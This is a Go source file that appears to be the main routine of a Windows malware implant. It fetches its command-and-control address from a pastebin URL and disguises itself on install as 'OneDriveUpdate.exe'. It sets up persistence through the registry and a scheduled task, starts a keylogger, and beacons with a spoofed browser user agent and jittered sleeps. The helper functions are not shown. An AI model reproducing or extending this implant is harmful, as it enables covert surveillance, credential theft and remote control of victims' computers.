package main

import (
	"net/http"
	"os"
	"time"

	"golang.org/x/sys/windows"
)

var RESOLVER_URL = "https://pastebin.com/raw/PNFkyRKV"
var C2_ADDRESS = ""
var SLEEP_TIME = 5 * time.Second
var JITTER = 0.3
var USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"

var staticKeyHex string // set via -ldflags "-X main.staticKeyHex=..."
var STATIC_KEY []byte
var SESSION_KEY []byte

var certPinHex string // set via -ldflags "-X main.certPinHex=..."
var CERT_PIN string
var C2_TRANSPORT *http.Transport

var AGENT_ID = ""

var MUTEX_NAME = "Global\\MySecretMalwareMutex_v3"
var mutexHandle windows.Handle
var INSTALL_NAME = "OneDriveUpdate.exe"

func main() {
	installSelf()

	if !checkForMutex() {
		os.Exit(0)
	}

	AGENT_ID = generateAgentID()

	installRegistryPersistence()
	installScheduledTask()

	performHandshake()

	go startKeylogger()

	for {
		beacon()
		sleepWithJitter()
	}
}
